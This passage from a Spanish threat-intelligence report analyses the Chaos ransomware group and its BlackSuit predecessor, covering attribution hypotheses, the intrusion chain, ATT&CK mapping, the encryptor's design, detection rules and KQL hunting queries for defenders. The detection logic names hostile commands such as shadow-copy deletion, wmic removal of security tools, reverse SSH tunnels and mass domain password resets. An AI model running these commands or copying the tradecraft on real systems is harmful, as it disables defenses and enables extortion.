> meses trabajando. Ninguna de las dos partes estaba coordinada con la otra,
> y la coincidencia es lo que hace visible el patrón de `E-1`: **lo que cae no
> es lo que opera.**

## O-6. Hipótesis alternativas consideradas

| Hipótesis | Evidencia a favor | Evidencia en contra | Valoración |
|---|---|---|---|
| **H-A.** `Chaos` es la continuación de BlackSuit | Talos lo valora así con confianza moderada, por metodología de cifrado, estructura de nota y conjunto de herramientas; este informe identifica el mecanismo concreto de la primera (`KJ-4`); y la continuidad del uso del teléfono (`KJ-5`) | Es confianza **moderada** declarada; no hay solapamiento de infraestructura ni de código publicado que lo pruebe; y un modelo de afiliados hace que «el mismo grupo» sea una categoría difusa | **Probable** *(55–80 %)* — **hipótesis preferida**, y heredada de la fuente sin elevarla |
| **H-B.** `Chaos` lo formaron algunos antiguos miembros, no la operación | Es la segunda mitad de la propia disyuntiva de Talos; y en un ecosistema de afiliados el personal circula entre marcas con normalidad | No la distingue de `H-A` ningún artefacto disponible | **Probable** *(55–80 %)*, y **las dos tienen la misma consecuencia defensiva**, que es lo que importa: las detecciones del predecesor siguen valiendo |
| **H-C.** `Chaos` es un grupo independiente que imita a BlackSuit | La colisión deliberada de nombre demuestra que este actor **usa la confusión como táctica**, y nada impide que imite también una metodología conocida | El porcentaje de cifrado como parámetro de operador con valor por omisión es una decisión de interfaz, no un rasgo público fácil de copiar; y el aviso oficial llamaba «único» al mecanismo | **Poco probable** *(20–45 %)* |
| **H-D.** La exclusión de países BRICS se cumple en la práctica | Es interés propio del operador —evitar jurisdicciones molestas— y del reclutamiento, que son las razones más fiables; y no hay víctimas brasileñas documentadas | Es una declaración del adversario; y en un modelo de afiliados la marca sólo puede imponerla **después** del ataque, expulsando | **Probable** *(55–80 %)* para Brasil; **y no aplicable al resto de la región**, que no está en la lista |
| **H-E.** Hay víctimas latinoamericanas no publicadas | El sitio de filtración sólo publica a quien no paga, de modo que **las víctimas que pagan no aparecen nunca**; y la victimología publicada refleja quién no pagó, no quién fue atacado | El sesgo afecta a todos los países por igual, de modo que no explica una ausencia **regional** frente a la presencia estadounidense | **Aproximadamente igual de probable** *(40–60 %)*, y es el límite estructural de toda victimología de extorsión |

**Pre-mortem.** Si en seis meses este informe resulta haber sido un error, ¿cuál será la causa más probable?

1. **Que alguien haya bloqueado las seis direcciones de `A.5`** y haya cortado tráfico de clientes de Tigo, Claro o Telecom Argentina. Es el daño más concreto que este informe puede provocar, y es la razón de que se consignen con tipo `artefacto` y de que la advertencia aparezca cinco veces.
2. **Que la desarticulación se haya leído como el fin del expediente** y la prioridad haya bajado. `E-1`, y es el error que el requisito invitaba a cometer.
3. **Que la lista de exclusiones se haya leído como una garantía para Brasil**, o —peor— **como un argumento de que la región entera está fuera**. Cubre a Brasil y a nadie más, es declaración del adversario, y en un modelo de afiliados la sanción llega después del daño.
4. **Que la regla de la mesa de ayuda no se haya escrito** porque no es un control técnico y por tanto no tuvo dueño. Es el fallo de despliegue más probable de la medida más importante.
5. **Que `KJ-4` sea falso** —que la correspondencia del porcentaje de cifrado sea casual— y que este informe haya dado solidez aparente a una valoración de confianza moderada. Es la pieza propia más atacable y se puede romper leyendo dos documentos públicos.
6. **Que `KJ-9` se haya ascendido a atribución.** Un parámetro en portugués identifica el idioma de quien escribió una línea de código. Nada más.

## O-7. Indicadores y señales de alerta

| Señal | Qué significaría | Acción inmediata |
|---|---|---|
| **`quickassist.exe` ejecutado tras una llamada telefónica entrante** | **El vector inicial del sucesor.** Es la señal más temprana de toda la cadena | Aislar el equipo; y preguntar al usuario quién llamó y desde qué número |
| **Intento de desinstalar la aplicación de segundo factor** o un control de seguridad por `wmic product ... call uninstall` | **La señal de oro de la fase de evasión.** No tiene uso legítimo no planificado | Incidente, con prioridad máxima: la fase siguiente es el cifrado |
| **Borrado de los registros de eventos de PowerShell** | Evasión en curso | Incidente |
| Instalación de **AnyDesk, ScreenConnect, OptiTune, Syncro RMM o Splashtop** no aprobada | Persistencia. **Son productos legítimos**, así que el criterio es la aprobación, no el binario | Verificar con el dueño del equipo; y revisar el inventario de `O-4.1`, pregunta 2 |
| **Conexión saliente al puerto 443 que no negocia TLS**, originada por `OpenSSH\ssh.exe` | **Túnel inverso de mando y control.** Tres condiciones juntas, sin falsos positivos conocidos | Incidente |
| **Cuenta de usuario oculta de la pantalla de inicio** por `SpecialAccounts\Userlist` | Persistencia establecida | Incidente |
| **Restablecimiento masivo de contraseñas de cuentas de dominio** | Persistencia, y es ruidosa si alguien escucha | Incidente |
| **Optimización de entrega de Windows apuntando a un servidor local en el puerto 8005** | Distribución de herramientas del adversario por la infraestructura de parches de la víctima | Incidente |
| **`GoodSync` o una herramienta de sincronización renombrada** —por ejemplo `wininit.exe` en ruta anómala— con tráfico a almacenamiento en nube | **Exfiltración en curso.** Y conviene recordar que excluye correo y bases de datos (`O-3.C`) | Incidente; y cortar la salida antes que el proceso |
| Ficheros con extensión **`.chaos`** o una nota **`readme.chaos.txt`** | Cifrado consumado | **Ejecutar el `Anexo D` de `CTI-2026-039` antes de restaurar** |
| Una **víctima brasileña** de este grupo | La lista de exclusiones queda refutada como política efectiva | **Revisión anticipada obligatoria** (`I-2`) |
| **Detenciones** relacionadas con BlackSuit o `Chaos` | Cerraría la pregunta central de `E-1` | **Revisión anticipada obligatoria** |

---

# NIVEL TÁCTICO
### Para: Analistas de SOC · Ingeniería de Detección · Threat Hunting · Horizonte: días–semanas

## T-1. Cadena de intrusión

**Cadena del predecesor** *(BlackSuit; septiembre de 2022 → julio de 2025)*

`Suplantación por correo con PDF malicioso o publicidad maligna` **o** `RDP comprometido (~13,3 %)` **o** `aplicación expuesta` **o** `credencial de VPN comprada a un corredor` → `Mando y control con Chisel, PuTTY, OpenSSH o MobaXterm` → `Movimiento lateral por RDP, PsExec y SMB` → `Antivirus desactivado por objeto de directiva de grupo desde el controlador de dominio` → `Persistencia con herramientas legítimas de administración remota, SystemBC y Gootloader` → `Descubrimiento con SharpShares y NetWorx; credenciales con Mimikatz y Nirsoft` → `Exfiltración con RClone, Cobalt Strike, Brute Ratel o derivados de Ursnif` → `Gestor de reinicio y vssadmin` → `Lote de ficheros .bat que crea admin, actualiza directiva, cifra, vigila y borra los registros`

**Cadena del sucesor** *(`Chaos`; febrero de 2025 → vigente)*

`Inundación de correo basura` → **`llamada telefónica suplantando a seguridad informática`** → **`la víctima lanza Quick Assist y se conecta a la sesión del atacante`** → `Descubrimiento con ipconfig, nltest, nslookup, net view, quser, tasklist` → `Optimización de entrega de Windows abusada para repartir herramientas >50 MB por el puerto local 8005` → `Cinco herramientas de administración remota instaladas` → `Cuenta oculta de la pantalla de inicio; contraseñas de dominio restablecidas` → `ldapsearch por túnel inverso de SSH; kerberoasting` → `Registros de PowerShell borrados; aplicación de segundo factor desinstalada por wmic` → `Exfiltración selectiva con GoodSync y con una herramienta renombrada wininit.exe` → `Túnel inverso de SSH al puerto 443` → `vssadmin ofuscado; cifrado con /encrypt_step; .chaos`

> ⚠ **La fase que invierte todo el supuesto habitual es la segunda.** No hay
> exploit, no hay adjunto, no hay credencial robada: **hay una conversación**.
> Y los pasos 2 a 4 no dejan **ningún artefacto distinguible**: el correo
> basura es correo basura, la llamada no pasa por ningún sistema nuestro, y
> `Quick Assist` es un ejecutable firmado por Microsoft cuyo uso legítimo es
> exactamente ése. El primer artefacto aparece cuando el adversario ya está
> dentro. **Por eso el control está en `E-2` y no en `X-3`.**

## T-2. Mapa MITRE ATT&CK

Marco: **ATT&CK v18**. **(G)** aviso gubernamental; **(P)** proveedor; **▲** prioridad de detección. Las filas marcadas **(G+P)** aparecen en los dos expedientes, y **son la base técnica del vínculo de `KJ-4`**.

| Táctica | ID | Técnica | Cómo se manifiesta |
|---|---|---|---|
| Reconocimiento | `T1598.004` ▲ | **Suplantación para obtener información: por voz** | **El vector inicial del sucesor.** Inundación de correo basura para provocar la llamada, y suplantación de personal de seguridad informática **(P)** |
| Desarrollo de recursos | `T1650` | Adquisición de acceso | **Corredores de acceso** que cosechan credenciales de VPN de registros de ladrones **(G)** |
| Acceso inicial | `T1566.001`, `T1566.002` | Suplantación: adjunto y enlace | PDF maliciosos y publicidad maligna; **el vector más común del predecesor** **(G)** |
| | `T1021.001` | RDP | **~13,3 % de los incidentes** del predecesor **(G)** |
| | `T1190` | Explotación de aplicación expuesta | **(G)** |
| | `T1078` | Cuentas válidas | **(G+P)** |
| | `T1133` | Servicios remotos externos | **(G+P)** |
| Ejecución | `T1059.001`, `T1059.003` | PowerShell y intérprete de órdenes | **(G+P)** |
| | `T1047` | Instrumental de administración de Windows | `wmic` para crear procesos remotos **y para desinstalar el segundo factor** **(P)** |
| | `T1219` ▲ | **Software de acceso remoto** | **`Quick Assist`** como vector inicial, y cinco herramientas de administración remota como persistencia **(G+P)** |
| Persistencia | `T1547.001` | Claves de ejecución | **(G+P)** |
| | `T1136` | Creación de cuenta | El lote del predecesor crea un administrador nuevo **(G)** |
| | `T1564.002` ▲ | **Ocultar artefactos: cuenta de usuario** | `SpecialAccounts\Userlist` para esconder la cuenta de la pantalla de inicio, manteniéndola usable por RDP **(P)** |
| | `T1098` ▲ | Manipulación de cuenta | **Restablecimiento masivo de contraseñas de dominio** con `net.exe user ... /dom` **(P)** |
| Evasión | `T1562.001` ▲ | **Deshabilitar herramientas de seguridad** | Predecesor: antivirus desactivado por **objeto de directiva de grupo** desde el controlador de dominio. Sucesor: **desinstalación de la aplicación de segundo factor por `wmic`** **(G+P)** |
| | `T1484.001` | Modificación de directiva de grupo | **(G)** |
| | `T1070.001` ▲ | **Borrado de registros de eventos** | Predecesor: aplicación, sistema y seguridad. Sucesor: **registros de PowerShell** **(G+P)** |
| | `T1027` | Ofuscación | El `vssadmin` del sucesor se almacena **carácter a carácter con un separador `0x0E`** y se descifra en ejecución **(P)** |
| | `T1036.004`, `T1036.005` | Enmascaramiento de tarea y de nombre | Herramienta de subida renombrada **`wininit.exe`** **(P)** |
| | `T1497.003` ▲ | Evasión por temporización | **Antianálisis en capas**: enumeración de clases y títulos de ventana para detectar depuradores, enumeración de procesos para máquinas virtuales y herramientas de análisis, y **comparación por hash contra firmas precomputadas para no almacenar nombres en claro** **(P)** |
| Acceso a credenciales | `T1003.001` | Volcado de LSASS | `Mimikatz` **(G)** |
| | `T1555` | Almacenes de contraseñas | Herramientas de Nirsoft **(G)**; `ldapsearch` y *kerberoasting* **(P)** |
| Descubrimiento | `T1016`, `T1018`, `T1033`, `T1057`, `T1135`, `T1482` | Red, anfitriones, usuario, procesos, recursos compartidos y confianzas de dominio | Siete órdenes documentadas una por una **(P)** |
| | `T1135` ▲ | **Descubrimiento de recursos compartidos** | **Lo hace el propio cifrador** en modo de red, excluyendo sólo los compartidos administrativos **(P)** |
| Movimiento lateral | `T1021.001`, `T1021.002`, `T1021.004` | RDP, SMB y SSH | **(G+P)** |
| Recolección y exfiltración | `T1005`, `T1567.002` | Datos locales; exfiltración por servicio web | `GoodSync` y la herramienta renombrada, **con filtro de antigüedad de un año y veinte extensiones excluidas** **(P)**; `RClone` en el predecesor **(G)** |
| Mando y control | `T1572` ▲ | **Túnel de protocolo** | **Túnel inverso de SSH al puerto 443**, con `StrictHostKeyChecking=no` y sin guardar la clave del anfitrión **(G+P)** |
| | `T1105` | Transferencia de herramientas | Y **abuso de la optimización de entrega de Windows** para repartirlas entre pares de la red víctima **(P)** |
| Impacto | `T1486` **(G+P)** | **Datos cifrados para impacto** | **El cifrado parcial con porcentaje elegible por el operador es la base del vínculo de `KJ-4`**: «enfoque único» en el aviso oficial, `/encrypt_step` con 30 % por omisión en el sucesor |
| | `T1490` | Inhibir recuperación del sistema | `vssadmin delete shadows /all` en los dos **(G+P)** |
| | `T1657` | Robo financiero | Doble extorsión; y el sucesor añade **amenaza de denegación de servicio** y de difusión a competidores y clientes **(G+P)** |

**Las ▲, y por qué.** `T1598.004` es el vector inicial y **no tiene detección técnica**: está marcada para que figure que el control es organizativo. `T1562.001` —la desinstalación del segundo factor— es la señal de oro: no tiene uso legítimo no planificado y precede inmediatamente al cifrado. `T1564.002`, `T1098` y `T1070.001` son persistencia y evasión ruidosas que casi nadie vigila. `T1572` tiene la mejor relación coste-beneficio del informe por sus tres condiciones conjuntas. `T1135` está marcada porque **lo hace el cifrador y no el operador**, lo que convierte la contención en una carrera. Y `T1497.003` está marcada por una razón negativa: advierte de que **el análisis dinámico va a fallar**, y conviene saberlo antes de intentarlo.

## T-3. Dónde atacamos en la Pirámide del Dolor

| Nivel | Valor aquí | Por qué |
|---|---|---|
| **Hashes** | **Bajo** | El cifrador del sucesor se compila por campaña —muestras de febrero, marzo y mayo de 2025— y es un programa de afiliados, de modo que las muestras se multiplican. Los del predecesor están en el aviso oficial y son históricos |
| **Direcciones IP** | **Bajo, y con una trampa grave** | **Seis de las setenta y una direcciones del aviso oficial son de operadores de banda ancha latinoamericanos** (`A.5`), y el propio aviso pide investigarlas antes de bloquear. **El valor de la lista es negativo si se ingiere sin filtrar** |
| **Dominios** | **Bajo** | La infraestructura de publicación fue incautada; la del sucesor es por víctima, con una URL `.onion` distinta para cada una |
| **Artefactos de red** | **Alto** | **Túnel inverso de SSH al 443 sin TLS**; optimización de entrega apuntando al puerto local 8005; tráfico a almacenamiento en nube desde un proceso renombrado |
| **Artefactos de anfitrión** | **El máximo de este expediente** | `quickassist.exe` tras una llamada; `SpecialAccounts\Userlist`; borrado de registros de PowerShell; `wmic ... call uninstall` del segundo factor; `vssadmin` ofuscado; extensión `.chaos` y nota `readme.chaos.txt` |
| **Herramientas** | **Alto, y con una advertencia** | `Mimikatz`, `Impacket`, `SharpShares`, `NetWorx`, `PowerTool`, `GMER`, `Chisel`, `RClone`, `GoodSync` y **cinco productos de administración remota**. La advertencia: **casi todas son legítimas**, de modo que el criterio no es el binario sino la aprobación y el contexto |
| **TTP** | **El máximo, y hay tres que el adversario no puede abandonar** | **(1)** La **llamada** como vector: es su diferencial, y renunciar a ella es renunciar a su acceso inicial. **(2)** El **cifrado parcial con porcentaje elegible**: es su ventaja de velocidad, y es la base del vínculo de `KJ-4`. **(3)** El **borrado de copias de sombra**: sin él, la víctima restaura y no paga |

> **La consecuencia de inversión.** Este expediente tiene una lista de
> indicadores que **es activamente peligrosa de ingerir sin filtrar** y un
> conjunto de artefactos de anfitrión que es excelente. Un equipo que cargue
> el aviso oficial en un bloqueo automático se habrá hecho daño; uno que
> despliegue las cinco reglas de `X-3` tendrá cobertura real contra las dos
> generaciones, porque las dos comparten la mayor parte de la cadena.

## T-4. Hipótesis de caza prioritarias

| Id | Hipótesis | Dónde se busca | Qué confirma | Coste |
|---|---|---|---|---|
| **H-1** | Se ejecutó **`quickassist.exe`** en algún puesto en los últimos doce meses | Registros de creación de procesos | **El vector inicial.** Para cada acierto, **preguntar al usuario si hubo una llamada** — que es la parte que ningún guion hace | **Bajo, y es la primera** |
| **H-2** | Se intentó **desinstalar la aplicación de segundo factor** o un control de seguridad por `wmic product ... call uninstall` | Línea de órdenes de procesos | **La señal de oro.** La fase siguiente es el cifrado | **Bajo** |
| **H-3** | Existe una clave bajo `SpecialAccounts\Userlist` que oculta una cuenta de la pantalla de inicio | Barrido de registro | **Persistencia establecida.** Y es un sitio donde no hay nada legítimo en la mayoría de los entornos | **Bajo** |
| **H-4** | Hubo una conexión saliente al **puerto 443 que no negoció TLS**, originada por `OpenSSH\ssh.exe` | Registros de proxy o de inspección, cruzados con creación de procesos | **El túnel de mando y control.** Tres condiciones, sin falsos positivos conocidos | **Medio** |
| **H-5** | Se borraron los **registros de eventos de PowerShell** en algún equipo | Registro de eventos del propio registro de eventos | Evasión | **Bajo** |
| **H-6** | Hay alguna de las **cinco herramientas de administración remota** de `A.6` instalada sin aprobación | Inventario de software | Persistencia **o** una herramienta legítima que nadie recuerda haber aprobado — **las dos cosas son hallazgos** | **Bajo** |
| **H-7** | Hubo **restablecimiento de contraseñas de varias cuentas de dominio** en una ventana corta, fuera de un procedimiento conocido | Registro de seguridad del controlador de dominio | Persistencia del sucesor | **Bajo** |
| **H-8** | La **optimización de entrega de Windows** está configurada contra un servidor local en un puerto no estándar | Configuración de la optimización de entrega en los puestos | Distribución de herramientas del adversario | **Medio** |
| **H-9** | Hay **`GoodSync`** o una herramienta de sincronización en ruta anómala o con nombre de binario de sistema | Inventario y barrido de rutas | **Exfiltración.** Buscar `wininit.exe` fuera de `System32` es trivial y específico | **Bajo** |
| **H-10** | Alguna de las **seis direcciones de `A.5`** está en una lista de bloqueo propia | Configuración del perímetro | **No es caza de compromiso: es caza de un corte autoinfligido.** Si está, hay que quitarla | **Trivial, y hay que hacerla primero** |

> **Una nota sobre `H-1`, que es la que más rinde y la que menos se parece a
> una consulta de seguridad.** Buscar `quickassist.exe` es fácil; lo difícil
> es el segundo paso, que es **llamar al usuario y preguntarle si alguien le
> telefoneó**. Ningún guion hace eso, y sin eso el hallazgo no se puede
> clasificar: `Quick Assist` tiene uso legítimo. **La caza de este vector es,
> literalmente, una conversación**, y conviene que figure así en el plan en
> lugar de esperar que una consulta la resuelva.

## T-5. Brechas de visibilidad que hay que cerrar primero

| Brecha | Qué nos impide ver | Coste | Prioridad |
|---|---|---|---|
| **No hay regla ni registro sobre asistencia remota pedida en una llamada entrante** | **El vector inicial completo**, que no deja artefacto antes del paso 5 | **Organizativo, no técnico** | **1** |
| No se alerta sobre **desinstalación de controles de seguridad por `wmic`** | La señal que precede al cifrado | Bajo | **2** |
| No se vigila `SpecialAccounts\Userlist` | Persistencia en un sitio sin uso legítimo | Bajo | **3** |
| No se distingue **SSH sobre el puerto 443** del TLS legítimo | El canal de mando y control | Medio: exige inspección o huella de protocolo | **4** |
| No hay **inventario de herramientas de administración remota aprobadas** | Persistencia con productos legítimos | Bajo | **5** |
| No se alerta sobre **cambios masivos de contraseña de dominio** | Persistencia ruidosa | Bajo | **6** |
| **No se sabe cuántos anfitriones alcanzaría un cifrador que enumere su subred** | El alcance del daño, que es lo que decide el coste del incidente | Alto: es un proyecto de segmentación | **7** |

---

# NIVEL TÉCNICO
### Para: Ingeniería de detección · Automatización · TIP/SIEM · Vida útil: meses

## X-1. Arsenal y capacidad

| Nombre | Qué es | Nota que importa |
|---|---|---|
| **Cifrador de `Chaos`** | Ejecutable de 32 bits, muestras de febrero, marzo y mayo de 2025 | **Multihilo, cifrado selectivo, y recursos locales y de red.** Antianálisis en capas con **comparación por hash contra firmas precomputadas**, para no almacenar en claro los nombres de las herramientas que detecta |
| `Quick Assist` | **Herramienta de asistencia remota incluida en Windows** | **No es malware.** Es el vector inicial, y su uso legítimo es exactamente el que el adversario le da |
| AnyDesk · ScreenConnect · OptiTune · Syncro RMM · Splashtop | **Cinco productos legítimos de administración remota** | Persistencia. **El criterio no es el binario: es la aprobación** |
| `GoodSync` | **Software legítimo de sincronización y respaldo** | Instrumento de exfiltración |
| Herramienta de subida renombrada **`wininit.exe`** | Cliente de sincronización a nube, por la sintaxis de sus parámetros | **Buscar `wininit.exe` fuera de `System32` es trivial y específico** |
| `Impacket` (`atexec`) · `ldapsearch` · `OpenSSH` de Windows | Herramientas legítimas o públicas | El cliente `OpenSSH` **viene con Windows**: el adversario no instala nada para montar su túnel |
| *(predecesor)* `Chisel` · `PuTTY` · `MobaXterm` · `SystemBC` · `Gootloader` · `SharpShares` · `SoftPerfect NetWorx` · `Mimikatz` · Nirsoft · `PowerTool` · `GMER` · `Cobalt Strike` · `Brute Ratel` · `RClone` · `Ursnif`/`Gozi` | Conjunto del predecesor, del aviso oficial | **La mayor parte sigue siendo relevante**, porque las dos generaciones comparten conjunto de herramientas — que es una de las tres similitudes que Talos cita |

### X-1.1 — El cifrador, en detalle, y las tres cosas que deciden la recuperación

| Propiedad | Detalle | Consecuencia para la recuperación |
|---|---|---|
| **Criptografía** | **Diffie-Hellman de curva elíptica sobre `Curve25519`** para lo asimétrico y **AES-256** para lo simétrico. Par de claves generado en cada ejecución con la interfaz criptográfica de Windows, clave privada **sólo en memoria**, pública exportada en formato `ECCPUBLICBLOB` | **Una clave distinta por fichero**, derivada por acuerdo de claves combinado con la clave maestra del operador y con otra generada por iteración. **No hay esperanza de recuperación sin la clave del operador** |
| **Metadatos** | Anexa **60 bytes** a cada fichero cifrado, con la clave pública en `ECCPUBLICBLOB`, el identificador de algoritmo y el tamaño de clave | Es la firma de fichero más fiable para identificar el alcance del cifrado |
| **Cifrado selectivo** | `/encrypt_step`, **30 % por omisión**, con cálculo de desplazamientos concretos «para optimizar la velocidad con corrupción completa del fichero» | **«Corrupción completa» es la frase que importa**: cifrar el 30 % no deja el 70 % utilizable |
| **Modos** | `local`, `network` y `local_network` | El tercero es el que convierte un equipo en un incidente de red |
| **Escalada** | Si falla el acceso normal, **modifica los descriptores de seguridad** y suplanta vales de proceso, enumerando `svchost.exe` y `explorer.exe` | Los permisos de ficheros no son una defensa |
| **Propagación** | En modo de red: enumera interfaces, identifica rangos privados, **genera la lista de todos los anfitriones de las subredes**, conecta por SMB, encola los recursos compartidos. Excluye sólo `ADMIN$`, `C$` e `IPC$` | **La segmentación decide el alcance** |
| **Exclusiones** | Carpetas de sistema, de navegador y de mantenimiento; ficheros de arranque, de sistema, de diagnóstico y de tema; **y los ya cifrados con extensión `.chaos`** | Las exclusiones son para no romper el sistema: el adversario quiere que la víctima pueda leer la nota |
| **Nota de rescate** | Descifrada con **XOR de clave de 25 bytes**, en trozos de cinco, con cálculos de desplazamiento para ofuscar la operación. 1.310 bytes | La clave está publicada en `A.4` |
| **Limpieza** | Termina hilos, libera memoria, cierra manejadores y recursos criptográficos, y sale limpiamente | Poca huella en memoria después |

> **Y el rasgo que más dice de la madurez:** el antianálisis **compara hashes
> contra firmas precomputadas** en lugar de contener los nombres de los
> depuradores y las herramientas que busca. Eso significa que **un análisis
> estático de cadenas no revela qué está evadiendo**, y que la lista de
> herramientas que detecta es invisible sin ejecutarlo — que es precisamente
> lo que no se puede hacer, porque termina al detectar el entorno de
> análisis. Es una decisión de diseño contra el analista, no contra el
> producto de seguridad.

## X-2. Artefactos de anfitrión persistentes

| Artefacto | Dónde | Confianza |
|---|---|---|
| **`quickassist.exe` ejecutado**, con una sesión entrante | Puesto Windows | **Alta como señal; requiere confirmación con el usuario** |
| Clave bajo `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist` con un valor `REG_DWORD` a `0` | Registro | **Alta.** Sin uso legítimo en la mayoría de los entornos |
| Instalación de AnyDesk, ScreenConnect, OptiTune, Syncro RMM o Splashtop | Software instalado | Media-alta: **depende de la aprobación** |
| **`wininit.exe` fuera de `C:\Windows\System32`** | Sistema de ficheros | **Alta.** Trivial de buscar, muy específico |
| Extensión **`.chaos`** y nota **`readme.chaos.txt`** | Sistema de ficheros | **Alta** |
| Ficheros con **60 bytes de metadatos anexados** terminando en clave `ECCPUBLICBLOB` | Ficheros cifrados | **Alta**: es la firma para medir el alcance |
| Registros de eventos de **PowerShell borrados** | Registro de eventos | Alta |
| *(predecesor)* Ficheros `.bat` y un **7zip cifrado** en `C:\Temp\`, `%APPDATA%`, `C:\ProgramData\`, `C:\Users\<usuario>\` o la raíz de `C:\` | Sistema de ficheros | Alta **(G)** |

## X-3. Lógica de detección prioritaria

### X-3.1 — `D-1` · `Quick Assist` ejecutado · **y la segunda mitad no es técnica**

```
EVENTO: ejecucion de quickassist.exe
ENTONCES registrar SIEMPRE, y para cada caso:
        PREGUNTAR AL USUARIO si alguien le telefoneo.

Esto NO es una alerta automatizable a un veredicto: Quick Assist tiene
uso legitimo. Es una alerta a una CONVERSACION, y conviene que el
procedimiento lo diga, porque si no, se desactiva por ruido.

Afinado que reduce el volumen a algo manejable:
 - correlacionar con un PICO DE CORREO BASURA hacia ese mismo buzon en
   las 24 h previas: es el paso 1 de la cadena, y es lo unico de los
   cuatro primeros pasos que SI deja rastro en un sistema nuestro
 - y con la ausencia de un ticket abierto por ese usuario
```

**Y la medida preventiva, que es mejor:** si `Quick Assist` no es requisito de negocio, **restringirlo por política de dispositivo**. Elimina el paso 4 de la cadena.

### X-3.2 — `D-2` · Desinstalación de un control de seguridad · **la señal de oro**

```
EVENTO: wmic product where name=<...> call uninstall /nointeractive
     O  desinstalacion de la aplicacion de segundo factor
     O  desinstalacion del agente de deteccion en el puesto
     O  (predecesor) modificacion de un objeto de directiva de grupo que
        desactiva el antivirus, originada en el controlador de dominio
ENTONCES INCIDENTE CON PRIORIDAD MAXIMA.

Razon: en las dos generaciones esta fase precede INMEDIATAMENTE al
cifrado. No es un indicio de compromiso: es un aviso de que el reloj
esta corriendo.

Coste de falso positivo: practicamente nulo. Una desinstalacion
planificada de un control de seguridad pasa por un cambio aprobado, y
por tanto se puede excluir por ventana.
```

### X-3.3 — `D-3` · Cuenta oculta de la pantalla de inicio

```
EVENTO: creacion o modificacion de un valor bajo
   HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\
       SpecialAccounts\Userlist
ENTONCES alertar SIEMPRE

La cuenta sigue existiendo y sigue sirviendo para entrar por RDP o con
runas; lo unico que cambia es que NO SE MUESTRA. Es persistencia pura,
y en la mayoria de los entornos no hay nada legitimo en esa clave.
```

### X-3.4 — `D-4` · Túnel inverso de SSH por el puerto 443

```
EVENTO: conexion saliente a tcp/443
Y       el proceso de origen es C:\WINDOWS\System32\OpenSSH\ssh.exe
Y       el trafico NO negocia TLS  (o la linea de ordenes contiene
        -R, StrictHostKeyChecking=no, o UserKnownHostsFile=/dev/null)
ENTONCES incidente

Las TRES condiciones juntas no tienen falsos positivos conocidos. Por
separado, cada una los tiene: hay administradores que usan OpenSSH, y
hay trafico no-TLS legitimo en el 443.

Y la variante sin inspeccion de trafico, que casi todo el mundo puede
hacer: basta la linea de ordenes del proceso. Un ssh.exe con -R y
StrictHostKeyChecking=no en un puesto que no es de administracion de
sistemas es suficiente para abrir incidente.
```

### X-3.5 — `D-5` · Exfiltración y preparación del cifrado

```
CUALQUIERA de:
 - wininit.exe ejecutandose desde una ruta que NO es System32
 - un proceso de sincronizacion con parametros de filtrado por
   antiguedad y exclusion masiva de extensiones
 - optimizacion de entrega de Windows configurada contra un servidor
   local en un puerto no estandar (8005 documentado)
 - restablecimiento de contrasenas de VARIAS cuentas de dominio en una
   ventana corta, con net.exe user ... /dom
 - vssadmin delete shadows /all, incluida la variante ofuscada
ENTONCES incidente

El ultimo es el mas tardio de la cadena y el mas facil de detectar; si
se llega a el, el cifrado es inminente o ya empezo.
```

## X-4. Consultas de caza

```kql
// =====================================================================
// H-1 y D-1 · LA PRIMERA CONSULTA: Quick Assist ejecutado, correlacionado
// con un pico de correo basura hacia el mismo usuario.
//
// El paso 1 de la cadena (inundacion de correo) es lo UNICO de los
// cuatro primeros pasos que deja rastro en un sistema nuestro. Usarlo
// como filtro convierte una consulta ruidosa en una lista corta.
// =====================================================================

let ventana = 365d;
let picos_correo = EmailEvents
| where Timestamp > ago(ventana)
| summarize correos = count() by RecipientEmailAddress, dia = bin(Timestamp, 1d)
| where correos > 200                      // ajustar a la linea base propia
| project RecipientEmailAddress, dia_pico = dia;
DeviceProcessEvents
| where Timestamp > ago(ventana)
| where FileName =~ "quickassist.exe"
| extend usuario = tolower(AccountUpn)
| join kind=leftouter (picos_correo
    | extend usuario = tolower(RecipientEmailAddress)) on usuario
| extend TrasPicoDeCorreo = iff(isnotempty(dia_pico)
         and Timestamp between (dia_pico .. dia_pico + 2d), true, false)
| project Timestamp, DeviceName, AccountUpn, TrasPicoDeCorreo,
          ProcessCommandLine, InitiatingProcessFileName
| order by TrasPicoDeCorreo desc, Timestamp desc

// Y el paso que ningun guion hace: para cada fila, PREGUNTAR al usuario
// si alguien le telefoneo. Quick Assist tiene uso legitimo; la llamada
// es lo que lo convierte en un incidente.
```

```kql
// =====================================================================
// H-2 y D-2 · LA SENAL DE ORO: desinstalacion de un control de
// seguridad. En las dos generaciones, esta fase precede inmediatamente
// al cifrado.
// =====================================================================

DeviceProcessEvents
| where Timestamp > ago(365d)
| where (FileName in~ ("wmic.exe","WMIC.exe") and ProcessCommandLine has "call uninstall")
     or (ProcessCommandLine has_all ("msiexec", "/x") and ProcessCommandLine has_any
         ("duo","okta","rsa","authenticator","mfa","defender","crowdstrike",
          "sentinel","carbonblack","cylance","sophos","trendmicro"))
| project Timestamp, DeviceName, AccountName, FileName,
          ProcessCommandLine, InitiatingProcessFileName,
          InitiatingProcessCommandLine
| order by Timestamp desc

// Exclusion correcta: por VENTANA DE CAMBIO APROBADO, no por producto.
// Una desinstalacion planificada tiene un cambio detras; una maliciosa
// no.
```

```kql
// =====================================================================
// H-3, H-4, H-7 y H-9 · Barrido de los artefactos de persistencia,
// tunel y exfiltracion. Cuatro consultas cortas en una.
// =====================================================================

// (a) Cuenta oculta de la pantalla de inicio
DeviceRegistryEvents
| where Timestamp > ago(365d)
| where RegistryKey has @"Winlogon\SpecialAccounts\UserList"
| project Timestamp, DeviceName, RegistryKey, RegistryValueName,
          RegistryValueData, InitiatingProcessCommandLine

// (b) Tunel inverso de SSH — sin necesidad de inspeccion de trafico
DeviceProcessEvents
| where Timestamp > ago(365d)
| where FileName =~ "ssh.exe"
| where ProcessCommandLine has_any ("-R ", "StrictHostKeyChecking=no",
                                    "UserKnownHostsFile=/dev/null")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine

// (c) Restablecimiento masivo de contrasenas de dominio
DeviceProcessEvents
| where Timestamp > ago(365d)
| where FileName =~ "net.exe" or FileName =~ "net1.exe"
| where ProcessCommandLine has "user" and ProcessCommandLine has "/dom"
| summarize intentos = count(), cuentas = dcount(ProcessCommandLine)
          by DeviceName, bin(Timestamp, 1h)
| where cuentas >= 3          // varias cuentas en una hora = persistencia
| order by Timestamp desc

